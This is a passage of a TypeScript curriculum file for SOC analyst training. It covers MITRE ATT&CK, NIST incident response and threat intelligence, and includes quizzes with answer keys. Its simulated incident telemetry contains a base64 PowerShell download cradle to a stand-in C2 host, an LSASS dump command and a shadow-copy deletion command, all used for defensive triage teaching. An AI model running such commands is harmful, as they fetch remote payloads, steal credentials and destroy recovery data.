import { Phase } from '../../types/curriculum';

export const phase3: Phase = {
  id: 'phase-3',
  phaseNumber: 3,
  title: 'Defensive Frameworks, Threat Intelligence & Malware Analysis',
  description: 'Map adversary behavior to MITRE ATT&CK TTPs, execute the 6-phase NIST SP 800-61 incident response cycle, and operationalize Threat Intelligence with the Pyramid of Pain.',
  iconName: 'Target',
  badgeColor: 'border-purple-500/30 text-purple-400 bg-purple-500/10',
  topics: [
    {
      id: 'mitre-attck',
      phaseId: 'phase-3',
      title: 'MITRE ATT&CK Framework: Tactics, Techniques & Procedures',
      subtitle: 'Adversary Behaviors, ATT&CK Navigator Heatmaps, & Technique ID Mapping',
      estimatedMinutes: 30,
      iconName: 'Grid',
      analogy: {
        headline: 'The Master Football Playbook & Opponent Scouting Report',
        story: 'In professional sports, coaches do not just say "the opponent tried to score." They break the game down systematically: The opponent\'s general goal (Tactic: Drive the ball down the field), the specific formation used (Technique: Shotgun formation with a screen pass), and the exact physical footwork and signals executed by the quarterback (Procedure: QB looked left, faked a pump, and threw a quick slant to #88). If the defense only watches the quarterback\'s shoes (an IP address or hash), the opponent changes shoes tomorrow. But if the defense recognizes the formation and playbook (TTPs), they can stop the play regardless of what shoes the players wear.',
        keyTakeaway: 'Hashes and IPs change in seconds. Tactics and Techniques stay the same for years. The MITRE ATT&CK framework allows SOC teams to categorize how attackers operate and detect the behavior, not just the tool.'
      },
      corporateReality: {
        headline: 'Enterprise ATT&CK Mapping, Coverage Heatmaps, and Purple Teaming',
        deepDive: ["The MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) matrix is the universal language of enterprise cyber defense.","- **Tactics (The \"Why\" - 14 Enterprise Tactics):**","  1. Initial Access (TA0001)","  2. Execution (TA0002)","  3. Persistence (TA0003)","  4. Privilege Escalation (TA0004)","  5. Defense Evasion (TA0005)","  6. Credential Access (TA0006)","  7. Discovery (TA0007)","  8. Lateral Movement (TA0008)","  9. Collection (TA0009)","  10. Command and Control (TA0011)","  11. Exfiltration (TA0010)","  12. Impact (TA0040)","  Plus Resource Development (TA0042) and Reconnaissance (TA0043).","- **Techniques (The \"How\"):** E.g., `T1059` (Command and Scripting Interpreter) with Sub-techniques like `T1059.001` (PowerShell) and `T1059.003` (Windows Command Shell).","- **Procedures (The Specific Implementation):** E.g., `powershell.exe -w hidden -nop -enc JABj...`.","SOCs use ATT&CK Navigator layers to visualize detection coverage: Green (verified detections), Yellow (partial coverage), Red (blind spots). During Purple Team exercises, Red and Blue teams simulate specific ATT&CK IDs to validate that SIEM/EDR rules fire as designed."].join('\n'),
        architectureNotes: [
          'SIEM Alert Tagging: Every enterprise detection rule must be tagged with its corresponding ATT&CK Tactic and Technique ID in its metadata.',
          'Threat Actor Profiling: Mapping threat actors (e.g. APT28, FIN7, Lazarus) against ATT&CK matrices highlights which specific techniques threaten your industry.',
          'De-duplication of Detection Logic: Focus detection on choke-point techniques (e.g. LSASS dumping T1003.001) rather than thousands of individual tool variants.',
          'Atomic Red Team: Automated validation tool by Red Canary to test ATT&CK techniques locally against your SOC telemetry.'
        ],
        realWorldCase: 'A healthcare conglomerate audited their SOC detection capabilities using the ATT&CK Matrix. While they had 40 alerts for Initial Access (Phishing), they had zero detections for Discovery (T1087 Account Discovery, T1082 System Information Discovery). Adversaries in a recent intrusion lived undetected for 4 months conducting network discovery without triggering a single alert.'
      },
      cheatSheet: {
        title: 'Core MITRE ATT&CK Enterprise Tactics & Key Techniques',
        description: 'Primary tactics, common techniques, and detection telemetry sources.',
        headers: ['Tactic ID', 'Tactic Name', 'Adversary Objective', 'Key Technique Examples', 'Telemetry Source'],
        rows: [
          {
            term: 'TA0001',
            description: 'Initial Access',
            commandOrId: 'Phishing (T1566), Public Exploit (T1190)',
            riskOrUsage: 'Gain initial foothold in corporate network.',
            severity: 'High'
          },
          {
            term: 'TA0002',
            description: 'Execution',
            commandOrId: 'PowerShell (T1059.001), Scheduled Task (T1053)',
            riskOrUsage: 'Run adversary-controlled code on target host.',
            severity: 'High'
          },
          {
            term: 'TA0003',
            description: 'Persistence',
            commandOrId: 'Registry Run Keys (T1547.001), New Service (T1543.003)',
            riskOrUsage: 'Maintain access across restarts and credential rotations.',
            severity: 'Critical'
          },
          {
            term: 'TA0004',
            description: 'Privilege Escalation',
            commandOrId: 'Token Impersonation (T1134), SUID (T1548.001)',
            riskOrUsage: 'Elevate from standard user to SYSTEM or root privileges.',
            severity: 'Critical'
          },
          {
            term: 'TA0006',
            description: 'Credential Access',
            commandOrId: 'LSASS Memory Dumping (T1003.001), Kerberoasting (T1558.003)',
            riskOrUsage: 'Steal account names, passwords, and ticket tokens.',
            severity: 'Critical'
          },
          {
            term: 'TA0011',
            description: 'Command and Control',
            commandOrId: 'Web Protocols (T1071.001), DNS (T1071.004)',
            riskOrUsage: 'Communicate with compromised systems from external infrastructure.',
            severity: 'High'
          }
        ]
      },
      sandboxType: 'mitre-matrix',
      sandboxConfig: {
        title: 'MITRE ATT&CK Matrix Explorer & Technique Mapper',
        instructions: 'Explore the 12 core enterprise tactics. Click techniques to view details, inspect sub-techniques, and map real-world security alerts to their precise MITRE technique IDs.',
        defaultData: {
          tactics: [
            { id: 'TA0001', name: 'Initial Access', techniques: ['T1566 (Phishing)', 'T1190 (Exploit Public-Facing App)', 'T1078 (Valid Accounts)'] },
            { id: 'TA0002', name: 'Execution', techniques: ['T1059.001 (PowerShell)', 'T1059.003 (Windows CMD)', 'T1053 (Scheduled Task)'] },
            { id: 'TA0003', name: 'Persistence', techniques: ['T1547 (Boot/Logon Autostart)', 'T1543 (Create Service)', 'T1136 (Create Account)'] },
            { id: 'TA0004', name: 'Privilege Escalation', techniques: ['T1068 (Exploitation for Privilege Escalation)', 'T1548 (Abuse Elevation Mechanism)'] },
            { id: 'TA0006', name: 'Credential Access', techniques: ['T1003.001 (LSASS Memory)', 'T1558.003 (Kerberoasting)', 'T1110 (Brute Force)'] },
            { id: 'TA0008', name: 'Lateral Movement', techniques: ['T1021.002 (SMB/Windows Admin Shares)', 'T1021.001 (Remote Desktop)'] },
            { id: 'TA0011', name: 'Command & Control', techniques: ['T1071.001 (Web Protocols: HTTPS)', 'T1071.004 (DNS)', 'T1573 (Encrypted Channel)'] }
          ]
        }
      },
      incident: {
        id: 'inc-3015',
        ticketNumber: 'SEC-3015',
        title: 'Multi-Stage Intrusion Mapping: Phishing Word Doc Spawning Encoded PowerShell',
        severity: 'Critical',
        affectedAsset: 'FIN-LAPTOP-09 (10.0.12.88)',
        timestamp: '2026-10-03 20:30:00 UTC',
        summary: 'EDR telemetry detected user opening "Invoice_Oct.docm" from Outlook, which spawned WINWORD.EXE -> powershell.exe with base64 encoded arguments, followed by an outbound connection on port 443 to a newly registered domain.',
        rawTelemetry: [
          'Timestamp: 2026-10-03T20:28:10Z | Process: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
          'Timestamp: 2026-10-03T20:28:11Z | Child Process: powershell.exe -ExecutionPolicy Bypass -NoProfile -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsACAAPQAgACcAVABsAHMAMQAyACcAOwAgAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcaHR0cHM6Ly9jMnNlcnZlci50b3AvYmVhY29uLnBzMScp',
          'Timestamp: 2026-10-03T20:28:14Z | Network Connection: FIN-LAPTOP-09 -> 198.51.100.77:443 (c2server.top) established'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Macro execution spawning encoded PowerShell downloading and executing a remote payload (IEX Net.WebClient) to an external C2 server is a confirmed multi-stage cyber intrusion.'
        },
        rootCauseOptions: {
          options: [
            'User opened a weaponized Office document containing VBA macros that executed an encoded PowerShell stager to download a Cobalt Strike beacon.',
            'Office 365 software update downloading language pack.',
            'IT automation script collecting hardware inventory.',
            'Antivirus scanner checking Word document metadata.'
          ],
          correctIndex: 0,
          explanation: 'Decoding the base64 string reveals `IEX(New-Object Net.WebClient).DownloadString(\'https://c2server.top/beacon.ps1\')`, classic macro-based malware delivery.'
        },
        containmentOptions: {
          options: [
            'Trigger EDR host network isolation on FIN-LAPTOP-09, kill the active PowerShell process, blacklist domain c2server[.]top and IP 198.51.100.77 on perimeter firewalls/proxies, and reset the user Active Directory password.',
            'Tell the user to save the document and restart Word.',
            'Delete the Word file from the desktop and leave the host online.',
            'Disable PowerShell across the entire company without investigating the endpoint.'
          ],
          correctIndex: 0,
          explanation: 'Standard containment: Isolate the endpoint, sever the active C2 session, block external network indicators across the enterprise perimeter, and initiate forensic investigation.'
        },
        mitreTechniques: [
          'T1566.001 - Phishing: Spearphishing Attachment',
          'T1059.001 - Command and Scripting Interpreter: PowerShell',
          'T1204.002 - User Execution: Malicious File',
          'T1071.001 - Application Layer Protocol: Web Protocols'
        ],
        slaMinutes: 15
      },
      flashcards: [
        {
          id: 'fc-3-1',
          question: 'What is the structural difference between a Tactic, a Technique, and a Procedure in the MITRE ATT&CK framework?',
          category: 'MITRE ATT&CK',
          difficulty: 'Junior',
          modelAnswer: 'A Tactic is the adversary\'s high-level goal or reason for performing an action (the "Why", e.g., Credential Access TA0006). A Technique represents the specific method used to achieve that tactical objective (the "How", e.g., OS Credential Dumping T1003). A Procedure is the exact, real-world step or specific software command executed by the adversary in an intrusion (the "Implementation", e.g., executing `procdump.exe -ma lsass.exe out.dmp`).',
          scoringTips: ['Tactic = Why / Goal.', 'Technique = How / Method.', 'Procedure = Specific command / implementation.', 'Use clear examples.'],
          corporateContext: 'Fundamental knowledge required for any security operations or threat hunting role.'
        },
        {
          id: 'fc-3-2',
          question: 'How do SOC teams use the ATT&CK Navigator to improve detection engineering?',
          category: 'Detection Engineering',
          difficulty: 'Mid',
          modelAnswer: 'The ATT&CK Navigator is a web-based matrix visualization tool. SOC teams use it to create color-coded coverage heatmaps. For each technique, they assess their detection visibility: Green for tested rules in production, Yellow for partial visibility, and Red for complete blind spots. By overlaying threat actor intelligence (e.g. mapping the specific techniques used by FIN7 or LockBit against their industry), the SOC can prioritize engineering new detection rules where threat likelihood is high and existing coverage is red.',
          scoringTips: ['Mention color-coded heatmap of detection coverage.', 'Explain gap analysis and blind spot identification.', 'Mention threat actor overlay to prioritize detection rules.'],
          corporateContext: 'Used by SOC leads and Detection Engineers for quarterly detection posture reviews.'
        },
        {
          id: 'fc-3-3',
          question: 'What is Sub-technique numbering in MITRE ATT&CK, and why was it introduced?',
          category: 'MITRE ATT&CK',
          difficulty: 'Junior',
          modelAnswer: 'Sub-techniques are dot-notated extensions of parent techniques (e.g., T1059 is "Command and Scripting Interpreter", while T1059.001 is "PowerShell", T1059.003 is "Windows Command Shell", and T1059.004 is "Unix Shell"). MITRE introduced them in 2020 because parent techniques had become too broad. Sub-techniques allow analysts to specify granular detection rules, telemetry requirements, and mitigations tailored to specific technologies.',
          scoringTips: ['Explain dot notation format (e.g. T1059.001).', 'Explain granularity of detection.', 'Provide an example like PowerShell or LSASS dumping.'],
          corporateContext: 'Shows the candidate is current with modern ATT&CK enterprise specifications.'
        }
      ],
      quiz: [
        {
          id: 'q-3-1',
          question: 'Which MITRE ATT&CK tactic encompasses adversary actions focused on maintaining their foothold across system restarts and credential changes?',
          options: ['Privilege Escalation (TA0004)', 'Persistence (TA0003)', 'Defense Evasion (TA0005)', 'Discovery (TA0007)'],
          correctIndex: 1,
          explanation: 'The Persistence tactic (TA0003) focuses specifically on techniques adversaries use to keep access to systems across restarts, changed credentials, and other interruptions.'
        },
        {
          id: 'q-3-2',
          question: 'In the MITRE ATT&CK identifier `T1003.001`, what does the `.001` designate?',
          options: [
            'The software version of the malware',
            'A sub-technique specifying LSASS Memory Dumping under OS Credential Dumping',
            'The patch release number of the Windows operating system',
            'The severity score of the CVE'
          ],
          correctIndex: 1,
          explanation: '`.001` indicates a sub-technique under T1003 (OS Credential Dumping), specifically referring to LSASS Memory Dumping.'
        },
        {
          id: 'q-3-3',
          question: 'Why is behavior-based detection mapped to ATT&CK more resilient than hash-based detection?',
          options: [
            'Because file hashes can be altered trivially by changing a single byte of code, while the underlying adversary technique (e.g. injecting into LSASS) remains identical',
            'Because file hashes cannot be computed on 64-bit systems',
            'Because MITRE ATT&CK replaces all operating system firewalls',
            'Because threat actors cannot access PowerShell'
          ],
          correctIndex: 0,
          explanation: 'Adversaries can recompile or pack malware to generate endless unique hashes, but their underlying behavioral techniques (like memory injection or scheduled tasks) are difficult and costly to change.'
        }
      ]
    },
    {
      id: 'killchain-nist-ir',
      phaseId: 'phase-3',
      title: 'Cyber Kill Chain vs NIST CSF Incident Response',
      subtitle: 'Lockheed Martin 7-Phase Kill Chain vs NIST SP 800-61 r2 Six-Phase IR Lifecycle',
      estimatedMinutes: 30,
      iconName: 'ShieldCheck',
      analogy: {
        headline: 'The Bank Robbery Sequence vs The Fire Department Protocol',
        story: 'The Cyber Kill Chain is the bank robber\'s plan: 1) Casing the building (Recon), 2) Building the explosive drill (Weaponization), 3) Smuggling the drill inside (Delivery), 4) Detonating the vault door (Exploitation), 5) Securing the escape route (Installation), 6) Radioing the getaway driver (C2), and 7) Stealing the gold bars (Actions on Objectives). If the police intercept the robbers at ANY single link in the chain, the heist fails completely! Meanwhile, the NIST Incident Response Framework is the Fire Department\'s protocol: 1) Preparation (trucks fueled, hoses checked), 2) Detection (alarm bells sounding), 3) Containment (closing fire doors to prevent spread), 4) Eradication (extinguishing the flames), 5) Recovery (clearing smoke, rebuilding), and 6) Lessons Learned (analyzing what caused the fire to improve fire codes).',
        keyTakeaway: 'The Kill Chain describes how the enemy attacks you. The NIST Framework dictates how you, as a professional SOC responder, methodically destroy their intrusion and restore the enterprise.'
      },
      corporateReality: {
        headline: 'Enterprise Incident Response Playbooks, Chain of Custody, and War Rooms',
        deepDive: ["Incident Response follows the gold standard **NIST SP 800-61 r2 Six-Phase Lifecycle**:","1. **Preparation:** Hardened system baselines, log retention, jump boxes, pre-approved containment access, and defined escalation matrices.","2. **Detection & Analysis (Identification):** Verifying True Positive vs False Positive, scoping the blast radius, identifying affected systems, and preserving volatile memory (RAM) BEFORE pulling plugs.","3. **Containment:**","   - *Short-Term Containment:* Immediate host isolation via EDR, perimeter firewall blocks of external C2 IPs.","   - *Long-Term Containment:* Temporary routing changes, revoking Kerberos ticket granting tickets (KRBTGT x2), disabling compromised user accounts.","4. **Eradication:** Reimaging or rebuilding compromised hosts from trusted gold images, removing backdoors/scheduled tasks, patching exploited CVEs, and resetting Active Directory credentials.","5. **Recovery:** Restoring systems to production under heightened monitoring, verifying normal traffic, and gradually returning business operations.","6. **Post-Incident Activity (Lessons Learned):** Writing the formal After-Action Report (AAR), documenting root causes, identifying detection gaps, and updating SIEM rules and IR playbooks."].join('\n'),
        architectureNotes: [
          'Order of Volatility: RFC 3227 mandates collecting evidence in order of volatility: CPU registers/cache -> Routing tables/ARP cache/RAM -> Temporary file systems -> Disk storage -> Remote logging data.',
          'Chain of Custody: Forensic disk and RAM images must have cryptographic hashes (SHA-256) recorded immediately upon acquisition to ensure legal admissibility in court.',
          'Out-of-Band (OOB) Communications: Never communicate about an active compromise via corporate email or Slack on the compromised network; use dedicated secure external channels (Signal, secure cell bridges).',
          'Ransomware Containment Rule: Never reboot a ransomware-infected machine without capturing memory; rebooting can trigger wipe routines or destroy decryption keys stored in RAM.'
        ],
        realWorldCase: 'During a massive ransomware outbreak, an inexperienced admin immediately pulled the power cords from 5 domain controllers. This destroyed the volatile RAM containing the memory-resident ransomware key and C2 connection table, extending the company downtime by three weeks. The incident response firm had to reconstruct the entire Active Directory forest from offline backups.'
      },
      cheatSheet: {
        title: 'NIST SP 800-61 r2 vs Cyber Kill Chain Playbook Guide',
        description: 'Comparative stages, critical analyst actions, and common pitfalls.',
        headers: ['NIST IR Phase', 'Kill Chain Phase Mapped', 'Primary SOC Analyst Action', 'Critical Forensic Pitfall to Avoid'],
        rows: [
          {
            term: '1. Preparation',
            description: 'Weaponization / Recon',
            commandOrId: 'Tooling & Baselines',
            riskOrUsage: 'Test IR playbooks, ensure EDR agents healthy, verify NTP clock synchronization.',
            severity: 'Low'
          },
          {
            term: '2. Detection & Analysis',
            description: 'Exploitation / Installation',
            commandOrId: 'Identification & Scoping',
            riskOrUsage: 'Capture volatile RAM first. Never power off or reboot the system blindly.',
            severity: 'Critical'
          },
          {
            term: '3. Containment',
            description: 'Command & Control (C2)',
            commandOrId: 'EDR Isolate & IP Blocks',
            riskOrUsage: 'Isolate host at network layer (EDR quarantine); maintain remote shell access.',
            severity: 'Critical'
          },
          {
            term: '4. Eradication',
            description: 'Lateral Movement',
            commandOrId: 'Reimage & Patching',
            riskOrUsage: 'Do not simply delete the malware file; root out all persistence (services/cron/keys).',
            severity: 'High'
          },
          {
            term: '5. Recovery',
            description: 'Actions on Objectives',
            commandOrId: 'Restore & Monitor',
            riskOrUsage: 'Restore from known-clean pre-incident backups; monitor for reinfection 24/7.',
            severity: 'Medium'
          },
          {
            term: '6. Lessons Learned',
            description: 'Post-Mortem Analysis',
            commandOrId: 'After-Action Report (AAR)',
            riskOrUsage: 'Update detection rules and patch vulnerabilities within 14 days of incident close.',
            severity: 'Low'
          }
        ]
      },
      sandboxType: 'nist-ir',
      sandboxConfig: {
        title: 'NIST Incident Response Stage Decision Lab',
        instructions: 'Walk through an unfolding live ransomware crisis. At each stage of the NIST IR cycle, make critical tactical choices and receive immediate evaluation on enterprise best practices.',
        defaultData: {
          stages: [
            {
              phase: 'Detection & Analysis',
              scenario: 'Alert: Endpoint FIN-WS-02 is encrypting network share files at 500 files/sec. EDR agent is online.',
              question: 'What is the immediate first action you execute?',
              options: [
                'Physically pull the power cable out of the wall.',
                'Issue EDR Network Isolation to sever network traffic while preserving RAM and forensic access.',
                'Reboot into Safe Mode to run a disk cleanup.',
                'Email the user to ask if they are archiving files.'
              ],
              correct: 1,
              feedback: 'EDR network isolation halts encryption across network shares while preserving memory-resident encryption keys and maintaining analyst access.'
            },
            {
              phase: 'Containment',
              scenario: 'Host FIN-WS-02 is network-isolated. Active Directory logs show the compromised user account was also used to authenticate to FILE-SRV-01.',
              question: 'What is the appropriate containment action for identity and shared assets?',
              options: [
                'Disable the user account in Active Directory, terminate active SMB sessions on FILE-SRV-01, and inspect FILE-SRV-01 for encrypted files.',
                'Delete the user account permanently from Active Directory.',
                'Wait until morning to inform the identity team.',
                'Allow the sessions to continue to observe the attacker behavior.'
              ],
              correct: 0,
              feedback: 'Disabling the account and terminating sessions cuts off the attacker without destroying the user SID history needed for log correlation.'
            }
          ]
        }
      },
      incident: {
        id: 'inc-3050',
        ticketNumber: 'SEC-3050',
        title: 'Active Ransomware Outbreak Spreading via Shared Department Drives',
        severity: 'Critical',
        affectedAsset: 'NAS-FINANCE-01 & 4 Workstations',
        timestamp: '2026-10-03 21:00:00 UTC',
        summary: 'Mass file renaming alert triggered: 12,000 files renamed with extension `.locked` on network share `\\\\NAS-FINANCE-01\\Accounting` within 4 minutes. Ransom note `README_RESTORE.txt` dropped in root directory.',
        rawTelemetry: [
          '2026-10-03T20:56:01Z NAS-AUDIT EventID=5145 User=corp\\jmartinez ShareName=\\\\*\\Accounting AccessMask=0x2 (Write) FileCount=12,400',
          '2026-10-03T20:57:15Z EDR-SERVER host=WS-FIN-04 process=vssadmin.exe arguments="delete shadows /all /quiet" action=BLOCKED',
          '2026-10-03T20:57:20Z EDR-SERVER host=WS-FIN-04 process=bcdr.exe (BlackCat/ALPHV ransomware variant) PID=4012 parent=cmd.exe'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Mass encryption of network share files combined with `vssadmin delete shadows` execution represents a full-scale active enterprise ransomware outbreak.'
        },
        rootCauseOptions: {
          options: [
            'Workstation WS-FIN-04 compromised by BlackCat ransomware via credential theft, attempting shadow copy deletion and mass network share encryption.',
            'Finance department running an automated backup compression tool.',
            'Network storage hardware RAID controller rebuild.',
            'User organizing files into encrypted zip containers.'
          ],
          correctIndex: 0,
          explanation: 'The process execution of `vssadmin.exe delete shadows /all /quiet` followed by the known ransomware binary `bcdr.exe` confirms active BlackCat ransomware.'
        },
        containmentOptions: {
          options: [
            'Immediately isolate WS-FIN-04 and NAS-FINANCE-01 via EDR, disable user `jmartinez`, capture memory on WS-FIN-04, block external ransomware C2 IPs, and initiate enterprise Major Incident bridge.',
            'Pay the ransom cryptocurrency immediately before checking backups.',
            'Format the NAS drive immediately to stop the infection.',
            'Restart all computers in the finance department simultaneously.'
          ],
          correctIndex: 0,
          explanation: 'Proper incident response requires network isolation to halt share encryption, preserving memory evidence, revoking compromised account credentials, and standing up the executive incident response team.'
        },
        mitreTechniques: [
          'T1486 - Data Encrypted for Impact',
          'T1490 - Inhibit System Recovery: Delete Volume Shadow Copies',
          'T1021.002 - SMB/Windows Admin Shares'
        ],
        slaMinutes: 15
      },
      flashcards: [
        {
          id: 'fc-3-4',
          question: 'According to RFC 3227 and NIST guidelines, what is the "Order of Volatility" when acquiring digital evidence?',
          category: 'Digital Forensics',
          difficulty: 'Mid',
          modelAnswer: 'The Order of Volatility dictates collecting the most transient (easily lost) evidence first before it disappears. The sequence is: 1) CPU registers, cache, and pipeline, 2) System Memory (RAM, ARP cache, routing tables, active network connections, running processes), 3) Temporary file systems (swap space, pagefile), 4) Disk storage (hard drives, solid state drives), 5) Remote logging and network management data, and 6) Physical topology and archival media.',
          scoringTips: ['List registers/cache first, followed by RAM.', 'Place non-volatile disks after memory.', 'Explain that rebooting destroys volatile memory.'],
          corporateContext: 'Essential question for any Tier 2/3 analyst performing on-host forensic acquisitions.'
        },
        {
          id: 'fc-3-5',
          question: 'Why is EDR network isolation preferred over physically unplugging an Ethernet cable during active incident containment?',
          category: 'Incident Response',
          difficulty: 'Mid',
          modelAnswer: 'Physically unplugging the cable severs all network communication, which prevents the SOC and Incident Response team from accessing the machine remotely, running memory acquisition scripts, or executing remediation playbooks. In contrast, EDR Network Isolation blocks all incoming and outgoing IP traffic EXCEPT for the encrypted management tunnel between the EDR agent and the cloud console. This contains the threat while allowing analysts to investigate, collect memory, and remediate without traveling to the physical machine.',
          scoringTips: ['EDR isolation maintains agent-to-console management tunnel.', 'Allows remote forensic collection and live response.', 'Physical unplugging prevents remote analyst access.'],
          corporateContext: 'Demonstrates modern cloud-native SOC response skills vs outdated legacy advice.'
        },
        {
          id: 'fc-3-6',
          question: 'What is the purpose of the Lessons Learned phase in the NIST IR cycle, and what deliverable is produced?',
          category: 'NIST Framework',
          difficulty: 'Junior',
          modelAnswer: 'The Lessons Learned phase is the post-incident retrospective where the team evaluates what went well, what failed, how quickly the incident was detected, and what gaps existed. The primary deliverable is the **After-Action Report (AAR)** or Post-Incident Report. It documents: 1) Executive summary, 2) Comprehensive timeline of events, 3) Root cause analysis, 4) Financial and operational impact, and 5) Actionable remediation items (e.g., specific detection rules to write, firewall policies to harden, or architecture changes) with assigned owners and deadlines.',
          scoringTips: ['Mention evaluation of response effectiveness.', 'Identify After-Action Report (AAR) or Post-Incident Report.', 'List key contents: timeline, root cause, remediation action items.'],
          corporateContext: 'Shows corporate maturity and understanding of continuous security posture improvement.'
        }
      ],
      quiz: [
        {
          id: 'q-3-4',
          question: 'In which phase of the NIST Incident Response lifecycle does an analyst isolate a compromised laptop from the network and block malicious C2 IP addresses on the perimeter firewall?',
          options: ['Preparation', 'Detection & Analysis', 'Containment', 'Post-Incident Activity'],
          correctIndex: 2,
          explanation: 'Containment focuses on preventing the spread of the attack and limiting immediate damage through network isolation, account suspension, and perimeter blocking.'
        },
        {
          id: 'q-3-5',
          question: 'Why should a SOC responder never restart a ransomware-infected computer before forensic memory capture?',
          options: [
            'Because restarting will make the monitor screen flicker.',
            'Because restarting immediately flushes volatile RAM, destroying active network connections, running process memory, and potential encryption keys.',
            'Because restarting downloads new Windows updates automatically.',
            'Because restarting causes the firewall to forget its configuration.'
          ],
          correctIndex: 1,
          explanation: 'RAM contains vital ephemeral data: decryption keys, command history, and C2 sockets. Powering off or restarting permanently destroys this evidence.'
        },
        {
          id: 'q-3-6',
          question: 'According to the Lockheed Martin Cyber Kill Chain, what happens if defenders detect and block an adversary at the "Delivery" phase (e.g. email gateway drops phishing lure)?',
          options: [
            'The entire attack chain is broken, preventing exploitation, installation, and actions on objectives.',
            'The attacker automatically gains Domain Admin privileges.',
            'The target host is immediately encrypted.',
            'The SIEM server reboots.'
          ],
          correctIndex: 0,
          explanation: 'The Cyber Kill Chain is sequential; disrupting any single stage halts the progression of the intrusion and prevents subsequent phases from executing.'
        }
      ]
    },
    {
      id: 'threat-intel-iocs',
      phaseId: 'phase-3',
      title: 'Threat Intelligence, IOCs & Malware Analysis Basics',
      subtitle: 'Pyramid of Pain, Hashes (MD5 vs SHA256), IOC vs IOA, VirusTotal, & Sandboxing',
      estimatedMinutes: 30,
      iconName: 'Cpu',
      analogy: {
        headline: 'The Criminal Biometrics Registry & Interpol Red Notice Database',
        story: 'If a bank robber robs a store wearing a green baseball cap (a File Hash), finding them by looking for green caps is trivial. But the next day, the robber simply puts on a blue hat (changing one byte changes the entire hash). If you search for the license plate on their getaway car (an IP address or Domain), they can switch stolen plates in 5 minutes. But if you analyze their psychological behavior—they always rob banks at 08:45 AM through the rear air duct using a specific thermal cutting torch (Tools & TTPs)—they cannot easily change who they are. Stopping their technique inflicts maximum pain on the criminal enterprise.',
        keyTakeaway: 'The Pyramid of Pain proves that blocking hashes is easy for defenders and trivial for attackers to evade. The higher you climb the pyramid towards TTPs, the more devastating you are to the adversary.'
      },
      corporateReality: {
        headline: 'Threat Intelligence Platforms (TIP), STIX/TAXII, and Sandbox Detonation',
        deepDive: ["Enterprise Threat Intelligence operationalizes data across three tiers:","1. **David Bianco\\'s Pyramid of Pain:**","   - *Hash Values (Trivial):* MD5, SHA-1, SHA-256. Attackers change them effortlessly via recompilation or crypters.","   - *IP Addresses (Easy):* Tor exit nodes, VPNs, compromised VPS proxies. Easily rotated.","   - *Domain Names (Simple):* DGA (Domain Generation Algorithms), bulletproof DNS, newly registered domains ($2 each).","   - *Network / Host Artifacts (Annoying):* User-agent strings, C2 URI patterns, registry keys. Forces attacker to modify source code.","   - *Tools (Challenging):* Cobalt Strike, Mimikatz, BloodHound, Impacket. Forcing attackers to rebuild or rewrite their toolsets.","   - *TTPs (Tough):* The adversary\\'s core tradecraft and operational methodology. If you negate their TTPs, they must start from scratch.","2. **Indicators of Compromise (IOC) vs Indicators of Attack (IOA):**","   - *IOC (Reactive):* Evidence of past intrusion (e.g. SHA256 hash `a1b2c3...`, malicious IP `198.51.100.22`).","   - *IOA (Proactive / Behavioral):* Evidence of active intent and behavior regardless of the tool (e.g. a process calling `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` into another process memory space).","3. **Malware Sandboxing Telemetry:**","   - Automated detonation platforms (VirusTotal Enterprise, Any.Run interactive sandbox, Hybrid Analysis).","   - Static analysis: PE headers, strings (`strings -a sample.exe`), import address tables (IAT, e.g. `kernel32.dll!CreateRemoteThread`), entropy (packed executable detection).","   - Dynamic analysis: API hooking, file system drops, network beaconing, registry persistence."].join('\n'),
        architectureNotes: [
          'STIX/TAXII Ingestion: Standardized Cyber Threat Intelligence (CTI) formats (Structured Threat Information Expression) ingested automatically into SIEM/EDR.',
          'Threat Feed Hygiene: Free public threat feeds have high false positive rates; enterprise SOCs correlate multiple commercial intelligence feeds (Mandiant, Recorded Future, CrowdStrike Falcon X).',
          'Retroactive IOC Hunting: When a new zero-day IOC is published (e.g. Log4j or MOVEit), SIEM queries must sweep backwards across 90 days of historical proxy, DNS, and firewall logs.',
          'Operational Defanging: All threat intelligence reports and Slack communications must strictly defang indicators (`example[.]com`, `10[.]0[.]0[.]1`).'
        ],
        realWorldCase: 'During the SolarWinds SUNBURST incident, the initial backdoor DLL was signed with a genuine cryptographic certificate and altered its compilation to generate unique hashes for different victims. Organizations relying solely on hash-based IOCs missed the breach entirely. Organizations looking for behavioral IOAs (unusual outbound HTTP traffic with DGA subdomains from the Orion server) detected the intrusion.'
      },
      cheatSheet: {
        title: 'Pyramid of Pain & Threat Intelligence Matrix',
        description: 'The six levels of David Bianco\'s Pyramid of Pain, pain caused to adversary, and defensive automation.',
        headers: ['Pyramid Level', 'Pain to Adversary', 'Example Indicator', 'SOC Operational Usage', 'Shelf Life / Longevity'],
        rows: [
          {
            term: 'Hash Values',
            description: 'Trivial',
            commandOrId: 'SHA-256 / MD5',
            riskOrUsage: 'Automated blocking in EDR/AV; instantly bypassed by 1-byte file change.',
            severity: 'Low'
          },
          {
            term: 'IP Addresses',
            description: 'Easy',
            commandOrId: 'IPv4 / IPv6 addresses',
            riskOrUsage: 'Perimeter firewall / ACL blocking; fast adversary rotation via VPN/cloud.',
            severity: 'Low'
          },
          {
            term: 'Domain Names',
            description: 'Simple',
            commandOrId: 'Dynamic DNS / DGA',
            riskOrUsage: 'DNS sinkholing / Web proxy blocking; domain takedowns.',
            severity: 'Medium'
          },
          {
            term: 'Network / Host Artifacts',
            description: 'Annoying',
            commandOrId: 'C2 URI patterns / User-Agents',
            riskOrUsage: 'Suricata / Snort IDS signatures, YARA rules on disk/RAM.',
            severity: 'High'
          },
          {
            term: 'Tools',
            description: 'Challenging',
            commandOrId: 'Mimikatz / Impacket / PsExec',
            riskOrUsage: 'Signature & behavior detection of specific attack frameworks.',
            severity: 'High'
          },
          {
            term: 'TTPs',
            description: 'Tough',
